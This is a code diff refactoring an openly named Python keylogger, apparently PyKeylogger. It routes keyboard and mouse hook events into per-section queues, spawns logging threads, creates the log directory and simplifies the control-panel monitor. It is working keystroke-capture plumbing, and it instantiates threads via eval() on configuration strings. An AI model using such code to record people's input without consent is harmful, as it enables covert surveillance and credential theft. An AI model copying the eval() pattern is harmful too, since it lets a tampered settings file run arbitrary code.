@@ -69,14 +69,16 @@ class KeyLogger:
         self.parse_control_key()
         self.NagscreenLogic()
         self.process_settings()
+        _settings['settings'] = self.settings
+        _cmdoptions['cmdoptions'] = self.cmdoptions
+        
+        self.create_log_directory(self.settings['General']['Log Directory'])
         os.chdir(self.settings['General']['Log Directory'])
         self.create_loggers()
         self.spawn_event_threads()
         
         if os.name == 'posix':
-            self.hashchecker = ControlKeyMonitor(self.cmdoptions,
-                                                 self.lw,
-                                                 self,
+            self.hashchecker = ControlKeyMonitor(self,
                                                  self.ControlKeyHash)
         self.hm = hooklib.HookManager()
         
@@ -92,29 +94,31 @@ class KeyLogger:
         #if os.name == 'nt':
         self.panel = False
         
-        _settings['settings'] = self.settings
-        _cmdoptions['cmdoptions'] = self.cmdoptions
-        
         #if self.options.hookMouse == True:
         #   self.hm.HookMouse()
     
     def spawn_event_threads(self):
         self.event_threads = {}
         self.queues = {}
+        self.logger.debug(self.settings.sections)
         for section in self.settings.sections:
             try:
                 threadname = self.settings[section]['General']['_Thread_Class']
                 self.queues[section] = Queue(0)
-                self.timer_threads[section] = \
+                self.event_threads[section] = \
                     eval(self.settings[section]['General']['_Thread_Class'] + \
-                    '(self.queues[threadname], section)')
+                    '(self.queues[section], section)')
             except KeyError:
+                self.logger.debug('not creating thread for section %s' % \
+                                        section, exc_info=True)
                 pass # this is not a thread to be started.
     
     def start(self):
         #self.lw.start()
         #self.iw.start()
         for key in self.event_threads.keys():
+            self.logger.debug('Starting thread %s: %s' % \
+                            (key, self.event_threads[key]))
             self.event_threads[key].start()
         
         if os.name == 'nt':
@@ -143,7 +147,21 @@ class KeyLogger:
         
         self.settings['General']['System Log'] = \
            self.filter.sub(r'__',self.settings['General']['System Log'])
-                
+    
+    def create_log_directory(self, logdir):
+        '''Make sure we have the directory where we want to log'''
+        try:
+            os.makedirs(logdir)
+        except OSError, detail:
+            if(detail.errno==17):  #if directory already exists, swallow the error
+                pass
+            else:
+                logging.getLogger('').error("error creating log directory", 
+                        exc_info=True)
+        except:
+            logging.getLogger('').error("error creating log directory", 
+                        exc_info=True)
+    
     def parse_control_key(self):
         self.ControlKeyHash = \
            ControlKeyHash(self.settings['General']['Control Key'])
@@ -171,6 +189,13 @@ class KeyLogger:
             systemloghandler.setFormatter(systemlogformatter)
             logging.getLogger('').addHandler(systemloghandler)
             
+        self.logger = logging.getLogger('')
+    
+    def push_event_to_queues(self, event):
+        for key in self.queues.keys():
+            self.logger.debug('Sticking event into queue %s' % key)
+            self.queues[key].put(event)
+    
     def OnKeyDownEvent(self, event):
         '''Called when a key is pressed.
         
@@ -178,7 +203,7 @@ class KeyLogger:
            and passes the event on to the system.
            
            '''
-        self.q_logwriter.put(event)
+        self.push_event_to_queues(event)
         
         self.ControlKeyHash.update(event)
         
@@ -206,7 +231,7 @@ class KeyLogger:
         return True
     
     def OnMouseDownEvent(self,event):
-        self.q_imagewriter.put(event)
+        self.push_event_to_queues(event)
         return True
     
     def stop(self):
@@ -411,7 +436,7 @@ class ControlKeyMonitor(threading.Thread):
        Brings up control panel if it has.
        
        '''
-    def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
+    def __init__(self, mainapp, controlkeyhash):
         threading.Thread.__init__(self)
         self.finished = threading.Event()
         
@@ -419,19 +444,16 @@ class ControlKeyMonitor(threading.Thread):
         # this way we don't start a second panel instance when it's already up
         #self.panel=False
         
-        self.lw = logwriter
         self.mainapp = mainapp
-        self.cmdoptions = cmdoptions
         self.ControlKeyHash = controlkeyhash
         
     def run(self):
         while not self.finished.isSet():
             if self.ControlKeyHash.check():
                 if not self.mainapp.panel:
-                    self.lw.PrintDebug("starting panel")
                     self.mainapp.panel = True
                     self.ControlKeyHash.reset()
-                    PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
+                    PyKeyloggerControlPanel(self.mainapp)
             time.sleep(0.05)
         
     def cancel(self):
